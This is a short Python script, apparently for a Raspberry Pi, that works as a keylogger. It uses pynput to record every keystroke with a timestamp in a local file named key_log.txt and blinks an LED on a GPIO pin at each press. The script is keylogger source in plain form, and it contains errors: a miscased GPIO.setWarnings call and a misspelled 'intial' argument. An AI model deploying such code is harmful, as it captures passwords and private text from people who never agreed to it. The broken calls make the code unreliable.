from pynput.keyboard import Key, Listener
import RPi.GPIO as GPIO
import logging
from time import sleep

# setting gpio pin for led
GPIO.setWarnings(False)
GPIO.setmode(GPIO.BOARD)
GPIO.setup(8, GPIO.OUT, intial=GPIO.LOW)

#current directory
log_dir = ""

#creating new file and setting format of everyline to be printed
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#add logging information before key value
def on_press(key):
    logging.info(str(key))
    GPIO.output(8, GPIO.HIGH)
    sleep(0.05)
    GPIO.output(8, GPIO.LOW)

#collect keys on pressed in keyboard
with Listener(on_press=on_press) as listener: 
    listener.join()
